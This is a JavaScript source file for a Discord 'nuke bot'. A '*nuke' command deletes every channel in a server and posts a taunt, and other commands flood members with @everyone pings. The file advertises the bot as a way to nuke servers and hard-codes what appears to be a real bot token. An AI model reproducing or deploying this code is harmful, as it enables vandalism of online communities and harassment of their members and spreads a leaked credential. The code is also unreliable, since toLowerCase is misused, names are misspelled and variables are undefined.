const express = require("express");
const app = express();
const keepalive = require('./readme.md')
//require express 

app.listen(3000, () => {
    client.on('ready', async () => {
        console.clear()
        console.log(`${client.user.tag} is online! website:https://sites.google.com/view/jomann-nuke-bot/home`)
    });
});

let Discord = require("discord.js")
let client = new Discord.Client({intents:
["GUILDS", "GUILD_MESSAGES"]});
//require discord.js

client.on('message', async (message)=> {
if(message.content.toLowerCase('*spam')) {
message.reply('@everyone get nuked :flushed: :poop:')
message.reply('@everyone get nuked :flushed: :poop:')
message.reply('@everyone get nuked :flushed: :poop:')
message.reply('@everyone get nuked :flushed: :poop:')
 };
});
client.on('message', async (message)=> {
if (message.content === '*nuke') {
    message.guild.channels.cache.forEach
          (channel => channel.delete());
          await message.guild.channels.create
          ('Nuked by Technology Power', {
              type : 'text'
          }).then(async channel=> {
          channel.send('@everyone my job is done :sunglasses: https://sites.google.com/view/jomann-nuke-bot/home')
          //channel delete command
          });
        };
          });
      client.on('message', async (message) => {
          if(message.content.toLowerCase('*big nuke')) {
            await message.guild.channels.create
            ('nuked by Technology Power', {
                type : 'text'
            }).then(async channel=> {
                channel.send('@everyone @admin @owner @community @everyone @everyone @everyone @everyone @everyone @everyone  get nuked!!!!!!!!!!!!!!!!!!!')
                channel.send('@everyone @admin @owner @community @everyone @everyone @everyone @everyone @everyone @everyone  get nuked!!!!!!!!!!!!!!!!!!!')
            });
        };
        client.on("ready", async() => {
let server = await client.guilds.cache.chache.size
let servercount = await client.guilds.chache.reduce((a,b) => a+b.member.count, 0 )

const activities = [
    `*nuke | *spam | ${servers} servers`,
    `Invite me now to nuke a server! | Nuking ${servercount} members`
];
        });
});
client.login('OTM4NTA4Mzc4NjY4NDIxMTMw.YfrUCg.VAFYfxJRiVn41-kal1NXIMUQFmA')